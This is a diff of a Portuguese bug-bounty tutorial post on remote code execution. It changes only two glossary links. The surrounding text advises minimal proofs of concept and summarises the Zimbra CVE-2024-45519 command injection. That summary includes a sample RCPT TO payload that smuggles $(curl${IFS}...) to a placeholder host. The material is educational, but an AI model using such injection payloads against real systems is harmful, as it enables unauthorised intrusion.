@@ -48,7 +48,7 @@ O impacto de RCE é o mais fácil de vender pro programa porque ele engloba quas
 
 Em programas reais, RCE costuma sentar na faixa **Crítica**. Casos contidos (autenticado, baixo privilégio, ambiente de HML) ainda pagam de **R$1.000 a R$3.000**; um RCE não-autenticado em produção entra em **dezenas de milhares**. O que move o ponteiro é **privilégio** (rodou como `www-data` ou como `root`?) e **autenticação** (precisava estar logado?).
 
-> ⚠️ **Cuidado redobrado na PoC** (Proof of Concept — a prova mínima de que o bug existe; detalhe no [Glossário](/posts/fundamentos-web-hacking/))**.** RCE é a classe onde é mais fácil **passar do ponto** e causar dano real. A regra é provar o mínimo: `id`, `whoami`, `hostname`, ou um *callback* OOB. **Nunca** `cat` em dado de cliente, nunca apague nada, nunca abra reverse shell (conexão em que o servidor invadido "liga de volta" pra você, te dando um terminal nele) sem autorização explícita. Falamos disso na nota ética no fim.
+> ⚠️ **Cuidado redobrado na PoC** (Proof of Concept — a prova mínima de que o bug existe; detalhe no [Glossário](/posts/fundamentos-web-hacking/#glossário-rápido-os-termos-que-vão-aparecer-na-série))**.** RCE é a classe onde é mais fácil **passar do ponto** e causar dano real. A regra é provar o mínimo: `id`, `whoami`, `hostname`, ou um *callback* OOB. **Nunca** `cat` em dado de cliente, nunca apague nada, nunca abra reverse shell (conexão em que o servidor invadido "liga de volta" pra você, te dando um terminal nele) sem autorização explícita. Falamos disso na nota ética no fim.
 
 ## Como funciona por trás
 
@@ -360,7 +360,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 Dois casos públicos mostram os mesmos mecanismos deste post na prática:
 
-> 💡 **CWE / CVSS**: o **CWE** é o "tipo" da falha (ex.: CWE-78 = OS Command Injection); o **CVSS** é a nota de gravidade de 0 a 10 (v3.1 e v4.0 convivem hoje). Como montar o vetor e argumentar a severidade com o triador: [02 — Severidade, impacto e triagem](/posts/severidade-impacto-triagem/). Definição rápida no [Glossário](/posts/fundamentos-web-hacking/).
+> 💡 **CWE / CVSS**: o **CWE** é o "tipo" da falha (ex.: CWE-78 = OS Command Injection); o **CVSS** é a nota de gravidade de 0 a 10 (v3.1 e v4.0 convivem hoje). Como montar o vetor e argumentar a severidade com o triador: [02 — Severidade, impacto e triagem](/posts/severidade-impacto-triagem/). Definição rápida no [Glossário](/posts/fundamentos-web-hacking/#glossário-rápido-os-termos-que-vão-aparecer-na-série).
 
 - **Command Injection via SMTP — CVE-2024-45519 (Zimbra).** O serviço `postjournal` do Zimbra Collaboration passava conteúdo de e-mail pra um comando do SO sem sanitizar. Um atacante **não-autenticado** mandava um e-mail cujo endereço no `RCPT TO` carregava `$(comando)`, contornando o filtro de espaço com `${IFS}` (ex.: `RCPT TO: <"aaa$(curl${IFS}seu-host)"@dominio.com>`). Classificado **CWE-78 (OS Command Injection)**, CVSS v3.1 **9.8** (vetor `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`; o CNA pontuou 10.0 com escopo alterado). É o caminho "input → shell" da Parte A, só que a fronteira foi o protocolo de e-mail em vez de um campo HTTP. ([NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-45519))
 
